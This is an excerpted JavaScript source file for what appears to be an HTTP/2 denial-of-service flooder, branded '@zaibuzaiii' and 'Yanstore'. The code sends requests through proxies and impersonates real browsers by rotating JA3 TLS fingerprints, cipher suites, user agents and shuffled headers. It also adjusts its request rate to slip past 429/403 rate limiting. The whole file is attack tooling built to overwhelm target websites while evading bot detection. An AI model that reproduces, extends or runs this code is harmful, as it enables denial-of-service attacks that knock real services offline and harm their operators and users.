...
const browserFingerprints = {
    chrome: {
        ...
        extensions: ["server_name", "extended_master_secret", "renegotiation_info", "supported_groups", "ec_point_formats", "session_ticket", "application_layer_protocol_negotiation", "status_request", "signed_certificate_timestamp", "key_share", "psk_key_exchange_modes", "supported_versions", "compress_certificate", "application_settings", "GREASE"],
        userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
        secChUa: `"Chromium";v="120", "Google Chrome";v="120", "Not-A.Brand";v="99"`,
        acceptLanguage: "en-US,en;q=0.9,id;q=0.8,ms;q=0.7"
    },
    edge: {
        ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25,0",
        ciphers: [
        ...
        extensions: ["server_name", "extended_master_secret", "renegotiation_info", "supported_groups", "ec_point_formats", "session_ticket", "application_layer_protocol_negotiation", "status_request", "signed_certificate_timestamp", "key_share", "psk_key_exchange_modes", "supported_versions", "compress_certificate"],
        userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0`,
        secChUa: `"Chromium";v="120", "Microsoft Edge";v="120", "Not-A.Brand";v="99"`,
    ...
    firefox: {
        ...
        extensions: ["server_name", "extended_master_secret", "renegotiation_info", "supported_groups", "ec_point_formats", "session_ticket", "application_layer_protocol_negotiation", "status_request", "key_share", "psk_key_exchange_modes", "supported_versions", "compress_certificate"],
        userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0`,
        secChUa: `"Firefox";v="115", "Gecko";v="20100101"`,
        acceptLanguage: "en-US,en;q=0.9,id;q=0.8"
    },
    safari: {
        ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25,0",
        ...
        secChUa: `"Safari";v="17", "AppleWebKit";v="605.1.15"`,
    ...
    brave: {
        ...
        extensions: ["server_name", "extended_master_secret", "renegotiation_info", "supported_groups", "ec_point_formats", "session_ticket", "application_layer_protocol_negotiation", "status_request", "signed_certificate_timestamp", "key_share", "psk_key_exchange_modes", "supported_versions", "compress_certificate"],
        userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
        secChUa: `"Chromium";v="120", "Brave";v="120", "Not-A.Brand";v="99"`,
        acceptLanguage: "en-US,en;q=0.9,id;q=0.8"
    },
    opera: {
        ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25,0",
        ...
        extensions: ["server_name", "extended_master_secret", "renegotiation_info", "supported_groups", "ec_point_formats", "session_ticket", "application_layer_protocol_negotiation", "status_request", "signed_certificate_timestamp", "key_share", "psk_key_exchange_modes", "supported_versions", "compress_certificate"],
        userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/85.0.0.0`,
        secChUa: `"Chromium";v="120", "Opera";v="85", "Not-A.Brand";v="99"`,
        acceptLanguage: "en-US,en;q=0.9,id;q=0.8"
    },
    mobile: {
        ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25,0",
        ...
        secChUa: `"Chromium";v="120", "Mobile";v="120", "Not-A.Brand";v="99"`,
        acceptLanguage: "en-US,en;q=0.9,id;q=0.8"
    }
};
...
function getRandomBrowserFingerprint() {
    const browsers = Object.keys(browserFingerprints);
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const fp = browserFingerprints[browser];
    return {
        browser: browser,
        ja3: fp.ja3,
        ciphers: fp.ciphers,
...
function getRandomCipherSuite() {
    ...
    const shuffled = allCiphers.sort(() => Math.random() - 0.5);
    const count = Math.floor(Math.random() * 6) + 4;
    return shuffled.slice(0, count);
}

function generateJA3Fingerprint(tlsSocket) {
    try {
        const cipher = tlsSocket.getCipher();
        const protocol = tlsSocket.getProtocol() || 'TLSv1.3';
        if (!cipher) return null;
        const ja3 = `${protocol.split('v')[1] || '771'},${cipher.name},0-23-10-11-13-16-5-35-18-51-45-43-27-21,29-23-24-25,0`;
...
function generateJA4Fingerprint(tlsSocket) {
    try {
        const cipher = tlsSocket.getCipher();
        const protocol = tlsSocket.getProtocol() || 'TLSv1.3';
        if (!cipher) return null;
        const ja4 = `t13${protocol.includes('1.3') ? 'd' : 'd'}${cipher.name.substring(0, 4)}${Math.floor(Math.random() * 1000)}`;
        return crypto.createHash('sha256').update(ja4).digest('hex').substring(0, 16);
    } catch (e) {
        return null;
    }
}

function generateHeadersWithFingerprint(targetHost, targetPath, fingerprint) {
    const fp = fingerprint || getRandomBrowserFingerprint();
    const secFetchUser = Math.random() < 0.75 ? "?1" : "?0";
    const secChUaMobile = fp.browser === "mobile" ? "?1" : "?0";
    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
    const accept = Math.random() < 0.5 ? 
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : 
        "application/json";
    const platform = Math.random() < 0.5 ? '"Windows"' : Math.random() < 0.5 ? '"macOS"' : '"Linux"';
    const platformVersion = Math.random() < 0.5 ? '"16.0.0"' : Math.random() < 0.5 ? '"15.0.0"' : '"14.0.0"';

    return {
        ":method": "GET",
        ":authority": Math.random() < 0.5 ? targetHost : `www.${targetHost}`,
        ":scheme": "https",
        ":path": targetPath,
        ...
        "Sec-CH-UA-Full-Version-List": fp.secChUa
    };
}
...
function getAdaptiveRate() {
    if (consecutiveErrors >= MAX_ERRORS) {
        adaptiveRate = Math.max(MIN_RATE, adaptiveRate - 2);
        consecutiveErrors = 0;
    } else if (consecutiveErrors === 0 && adaptiveRate < MAX_RATE) {
        adaptiveRate = Math.min(MAX_RATE, adaptiveRate + 1);
    }
    return Math.max(MIN_RATE, Math.min(MAX_RATE, adaptiveRate));
}

// ========== ROTATE TLS FINGERPRINT PER KONEKSI ==========
function getRotatedTLSConfig() {
    const fp = getRandomBrowserFingerprint();
    const cipherSuite = getRandomCipherSuite().join(':');
    const isTLS13 = Math.random() < 0.7;
    
    return {
        ciphers: cipherSuite,
        secureProtocol: isTLS13 ? 'TLSv1_3_method' : 'TLSv1_2_method',
        minVersion: isTLS13 ? 'TLSv1.3' : 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ja3: fp.ja3,
        userAgent: fp.userAgent,
        secChUa: fp.secChUa,
...
if (cluster.isMaster) {
    console.clear();
    console.log(`@zaibuzaiii`.bgRed), console.log(`[!] Yanstore`);
    console.log(`--------------------------------------------`.gray);
...
function runFlooder() {
    ...
    function getRandomBrowser() {
        const browsers = ['chrome', 'edge', 'firefox', 'safari', 'brave', 'opera', 'mobile'];
        return browsers[Math.floor(Math.random() * browsers.length)];
    }

    // ========== GENERATE HEADERS DENGAN SHUFFLE ==========
    const fingerprint = getRandomBrowserFingerprint();
    const browser = fingerprint.browser;
    const rawHeaders = generateHeadersWithFingerprint(parsedTarget.host, parsedTarget.path, fingerprint);
    const headers = shuffleHeaders(rawHeaders); // Acak urutan header
    ...
    Socker.HTTP(proxyOptions, async (connection, error) => {
        ...
        // ========== TLS OPTIONS DENGAN ROTASI FINGERPRINT ==========
        const tlsConfig = getRotatedTLSConfig();
        const tlsOptions = {
            secure: true,
            ALPNProtocols: Math.random() < 0.9 ? ["h2", "http/1.1"] : ["h2"],
            ...
            sessionTimeout: Math.floor(Math.random() * (600 - 60 + 1)) + 60,
        ...
        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, () => {
            ...
            const ja4Fingerprint = generateJA4Fingerprint(tlsSocket);
        ...
        clients.forEach(client => {
            const intervalId = setInterval(() => {
                async function sendRequests() {
                    ...
                    const currentRate = getAdaptiveRate();
                    const effectiveRate = Math.min(args.Rate, currentRate);
                                ...
                                const requestPromise = new Promise((resolve, reject) => {
                                    ...
                                    .on('response', response => {
                                        ...
                                        if (statusCode === 429 || statusCode === 403) {
                                            consecutiveErrors++;
                                            if (consecutiveErrors >= MAX_ERRORS) {
                                                adaptiveRate = Math.max(MIN_RATE, adaptiveRate - 3);
                                                consecutiveErrors = 0;
                                            }
                                        } else {
